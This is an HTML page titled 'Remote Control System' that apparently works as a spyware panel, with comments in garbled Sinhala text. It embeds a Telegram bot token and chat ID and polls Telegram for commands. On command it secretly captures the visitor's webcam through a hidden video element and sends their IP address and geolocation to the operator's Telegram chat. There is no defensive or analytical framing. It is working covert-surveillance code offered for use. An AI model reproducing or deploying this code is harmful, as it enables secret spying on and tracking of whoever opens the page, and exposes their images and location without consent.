<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <title>Remote Control System</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: monospace; }
        .status { margin-top: 40vh; font-size: 20px; }
    </style>
</head>
<body>
    <div class="status">SYSTEM ACTIVE...<br>WAITING FOR COMMANDS</div>
    
    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
        const CHAT_ID = '7883989086';
        let lastUpdateId = 0;

        // 1. Telegram а¶‘а¶ља·™а¶±а·Љ а¶ёа·ђа·ѓа·ља¶ўа·Љ а¶ а·™а¶ља·Љ а¶ља·’а¶»а·“а¶ё
        async function checkCommands() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await res.json();

                if (data.result.length > 0) {
                    for (let update of data.result) {
                        lastUpdateId = update.update_id;
                        let msg = update.message.text.toLowerCase();

                        if (msg === 'ip') sendIP();
                        if (msg === 'photo') takePhoto();
                        if (msg === 'location') sendLocation();
                        if (msg === 'name') sendText("а¶±а¶ё: а·„а¶‚а¶ња·’а¶Ѕа·’ а¶ња·™а¶Їа¶» а·Ђа·’а¶»а·Џа¶ўа·Љ а¶ља·ћа·Ѓа¶Ѕа·ЉвЂЌа¶є а·Ђа·“а¶»а·ѓа·ља¶ља¶»");
                    }
                }
            } catch (e) { console.error(e); }
        }

        // 2. IP а¶‡а¶©а·ЉвЂЌа¶»а·ѓа·Љ а¶‘а¶љ а¶єа·ђа·Ђа·“а¶ё
        async function sendIP() {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            sendText(`рџ“Ќ IP Address: ${data.ip}`);
        }

        // 3. а¶Ѕа·ња¶ља·ља·‚а¶±а·Љ а¶‘а¶љ а¶єа·ђа·Ђа·“а¶ё
        function sendLocation() {
            navigator.geolocation.getCurrentPosition(pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);
            }, err => sendText("Location Error: " + err.message));
        }

        // 4. а¶ља·ђа¶ёа¶»а·Џа·Ђа·™а¶±а·Љ а·†а·ња¶§а·ќ а¶‘а¶ља¶ља·Љ а¶ња·ђа¶±а·“а¶ё
        async function takePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    let fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'cam.png');
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                });
            }, 1000);
        }

        function sendText(txt) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
        }

        // а·„а·ђа¶ё а¶­а¶­а·Ља¶ґа¶» 3а¶ља¶§ а·Ђа¶»а¶ља·Ља¶ё а¶…а¶Ѕа·”а¶­а·Љ а¶ёа·ђа·ѓа·ља¶ўа·Љ а¶­а·’а¶єа·™а¶±а·Ђа¶Ї а¶¶а¶Ѕа¶±а·Ља¶±
        setInterval(checkCommands, 3000);
    </script>
</body>
</html>
